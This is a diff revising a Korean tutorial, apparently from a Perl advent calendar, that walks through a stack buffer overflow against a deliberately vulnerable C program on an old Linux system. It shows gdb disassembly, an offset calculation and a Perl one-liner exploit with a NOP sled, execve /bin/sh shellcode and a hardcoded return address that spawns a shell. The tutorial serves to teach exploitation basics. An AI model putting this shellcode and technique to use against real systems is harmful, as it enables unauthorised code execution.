@@ -53,92 +53,113 @@ Author:   h00ray
 공격 대상
 ----------
 
-그럼 지금부터 메모리 보호기법이 적용되어있지않은 리눅스 커널을 대상으로 간단한 해킹을 해보도록 하겠습니다.
+지금부터 메모리 보호기법을 적용하지않은 (고대의?) 리눅스 커널을 대상으로 간단한 해킹을 해보죠.
 
-공격할 프로그램입니다.
-//vuln.c
-//gcc -o vuln vuln.c
-#include <stdio.h>
+다음은 공격할 프로그램의 전체 코드입니다.
 
-int main(int argc, char *argv[])
-{
-    char buffer[256];
+    #!cpp
+    //vuln.c
+    //gcc -o vuln vuln.c
+    #include <stdio.h>
+    
+    int main(int argc, char *argv[])
+    {
+        char buffer[256];
+    
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+    
+        return 0;
+    }
+
+해킹에 성공하기 위해서는 "프로그램 구조를 개발자보다 잘 알아야 한다"라는
+말이 있을정도로 프로그램의 구조를 완벽하게 이해하고 있어야합니다.
+이제 분석을 하기위해 `gdb`를 실행합니다.
+
+    #!bash
+    $gdb vuln
+    
+    (gdb) disass main
+    Dump of assembler code for function main:
+    0x80483f8 <main>:	push   %ebp
+    0x80483f9 <main+1>:	mov    %esp,%ebp
+    0x80483fb <main+3>:	sub    $0x100,%esp
+    0x8048401 <main+9>:	mov    0xc(%ebp),%eax
+    0x8048404 <main+12>:	add    $0x4,%eax
+    0x8048407 <main+15>:	mov    (%eax),%edx
+    0x8048409 <main+17>:	push   %edx
+    0x804840a <main+18>:	lea    0xffffff00(%ebp),%eax
+    0x8048410 <main+24>:	push   %eax
+    0x8048411 <main+25>:	call   0x8048340 <strcpy>
+    0x8048416 <main+30>:	add    $0x8,%esp
+    0x8048419 <main+33>:	lea    0xffffff00(%ebp),%eax
+    0x804841f <main+39>:	push   %eax
+    0x8048420 <main+40>:	push   $0x8048480
+    0x8048425 <main+45>:	call   0x8048330 <printf>
+    0x804842a <main+50>:	add    $0x8,%esp
+    0x804842d <main+53>:	leave  
+    0x804842e <main+54>:	ret    
+    0x804842f <main+55>:	nop    
+    End of assembler dump.
+
+대충 봐도 현기증을 유발하는 디어셈블된 코드입니다.
+유심히 살펴봐야 할 부분은 `strcpy`함수를 호출하는 부분입니다.
+
+    #!plain
+    0x8048411 <main+25>:	call   0x8048340 <strcpy>
+
+간단하게 `strcpy` 함수에 대해 좀 더 알아보죠.
+
+    #!cpp
     strcpy(buffer, argv[1]);
-    printf("%s\n", buffer);
-}
 
-해킹에 성공하기 위해서는 "프로그램 구조를 개발자보다 잘 알아야 한다"라는 말이 있을정도로 
-프로그램의 구조를 완벽하게 이해하고 있어야합니다.
-그렇다면 이제 분석을 하기위해 gdb를 실행 해봅시다.
-$gdb vuln 
+앞의 코드는 `argv[1]`의 값을 버퍼에 복사합니다.
+요약하면 `eax`에는 `buffer`의 값 256 바이트,
+`edx`에는 `argv[1]`의 값이 들어가 있습니다.
 
-(gdb) disass main
-Dump of assembler code for function main:
-0x80483f8 <main>:	push   %ebp
-0x80483f9 <main+1>:	mov    %esp,%ebp
-0x80483fb <main+3>:	sub    $0x100,%esp
-0x8048401 <main+9>:	mov    0xc(%ebp),%eax
-0x8048404 <main+12>:	add    $0x4,%eax
-0x8048407 <main+15>:	mov    (%eax),%edx
-0x8048409 <main+17>:	push   %edx
-0x804840a <main+18>:	lea    0xffffff00(%ebp),%eax
-0x8048410 <main+24>:	push   %eax
-0x8048411 <main+25>:	call   0x8048340 <strcpy>
-0x8048416 <main+30>:	add    $0x8,%esp
-0x8048419 <main+33>:	lea    0xffffff00(%ebp),%eax
-0x804841f <main+39>:	push   %eax
-0x8048420 <main+40>:	push   $0x8048480
-0x8048425 <main+45>:	call   0x8048330 <printf>
-0x804842a <main+50>:	add    $0x8,%esp
-0x804842d <main+53>:	leave  
-0x804842e <main+54>:	ret    
-0x804842f <main+55>:	nop    
-End of assembler dump.
+어셈블리 코드를 보면 `edx` 값을 넣고, 그 후 `eax(buffer)`를 스택에 넣으므로,
+결국 `strcpy(%eax,%edx);`처럼 들어있는 셈입니다.
+과연 생각한 것이 맞는지 `gdb`를 사용해서 확인해보겠습니다.
 
-대충 봐도 현기증을 유발하는 디어셈블된 코드이지만 우리가 봐야 할 부분은 strcpy함수를 call하는부분 입니다.
-0x8048411 <main+25>:	call   0x8048340 <strcpy> 여기만 주의 깊게 봐주면 됩니다!!!!
+    #!bash
+    (gdb) b *main+25
+    (gdb) r 1
+    Starting program: /home/vuln 1
+    
+    Breakpoint 1, 0x8048411 in main ()
+    (gdb) x/s $edx
+    0xbffffca0:	 "1"
 
-그렇다면 보기전에 간단하게 우선 strcpy함수를 알아봅시다.
-strcpy(buffer, argv[1]);
-argv[1]의 값을 buffer에 복사합니다.
-네 끝이에요 한 마디로 
-eax에는 buffer의 값 256byte
-edx에는 argv[1]의 값이 들어가있습니다.
+우선 `main+25` 지점에 브레이크 포인트를 겁니다.
+그 후 인자로 `1`을 주고 실행하면 `edx`에는 예상한대로 `1`이라는 값이 들어가 있습니다.
 
-어셈블리 코드를 보면 edx(argv[1]) 값을 push 그후 eax(buffer)를 스택에push
-strcpy(%eax,%edx); 이런식으로 들어가있는겁니다.
-근데 과연 생각한게 맞는지 초호화 디버깅툴인 gdb를 사용해서 확인해보도록 하겠습니다.
-디버깅을 할때 항상 그랬던 것 처럼 break point를 걸어줍니다.
+이제 `0xffffff00`이 뭘 뜻하는지 알아야합니다.
+16진수를 10진수로 바꾸면 `256`이라는 값이 나옵니다.
+256 바이트를 `buffer`가 사용하고 있으니, `ret` 주소는 `256 + 4`입니다.
 
-(gdb) b *main+25
-(gdb) r 1
-Starting program: /home/vuln 1
+자! 이제 펄 스크립트를 사용해 공격해보죠!
 
-Breakpoint 1, 0x8048411 in main ()
-(gdb) x/s $edx
-0xbffffca0:	 "1"
+    #!perl
+    $./vuln `perl -e 'print"A"x260'`
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Segmentation fault (core dumped)
 
-main+25에 break point를 걸었고 그후 인자를 1을 주고 실행해본결과 edx에는 역시 예상했던데로 1이라는 값이 들어가있습니다.
-이제 0xffffff00이 뭘 뜻하는건지 알아야겠습니다. 16진수이므로 사람이 알아볼수있게 10진수로 바꾸면 256byte라는 값이나오네요.
-256byte를 buffer가 사용하고있으니 256byte +4는 ret주소입니다.
+`ret`값을 덮어쓰면서 공격하니 세그멘테이션 폴트 오류와 함께 강제 종료됩니다.
+이제 익스플로잇 코드를 작성하면 끝입니다.
 
-$./vuln `perl -e 'print"A"x260'`
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Segmentation fault (core dumped)
+    #!perl
+    $./vuln `perl -e 'print "\x90"x125 , "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80","\x90"x110,"\x38\xf9\xff\xbf"'`
+    1?h//shh/bin??°
+                    ?8
+    bash$
 
-perl 스크립트를 사용해서 공격해봤습니다..(펄 달력인데 이제서야 펄이나오네요..ㅜㅜ)
-공격 해보니 역시 ret값을 덮어쓰니 오류를 출력하면서 프로그램이 종료되네요.
-자 이제 exploit script만 작성해주면 끝입니다.
+와우! 공격에 성공했습니다 ;)
 
+`\x90`은 `nop`이며 그냥 아무 것도 하지않고 다음 명령어로 넘어갑니다.
+`\x31\xc0\x50...\x0b\xcd\x80` 부분은 쉘 코드입니다.
+간단하게 쉘을 출력해주는 기계어 집합입니다.
+`\x38\xf9\xff\xbf` 부분은 스택의 값으로 `gdb`를 통해서 살펴 본 스택 주소입니다.
 
-$./vuln `perl -e 'print "\x90"x125 , "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80","\x90"x110,"\x38\xf9\xff\xbf"'`
-1?h//shh/bin??°
-                ?8
-bash$
-네 공격에 성공했습니다 ;)
-이제 exploit을 살펴보자면 "\x90"은 nop입니다. 그냥 아무것도 안하고 다음 명령어로 넘어갑니다.
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" 이 부분은 쉘코드입니다. 간단하게 shell을 출력해주는 기계어 집합입니다.
-"\x38\xf9\xff\xbf" 이 부분은 스택의 값인데요. gdb를 통해서 본 스택 주소를 넣어주었습니다.
 
 마치면서
 크리스마스 펄 달력이라는 내용과 맞게 펄에대한 팁이나 재미있는 내용을 주제로 선정했어야하는데... 평소에 해킹을 펄로 하다보니 글을 쓸수있는 주제가 한정되어 많이 아쉽네요.
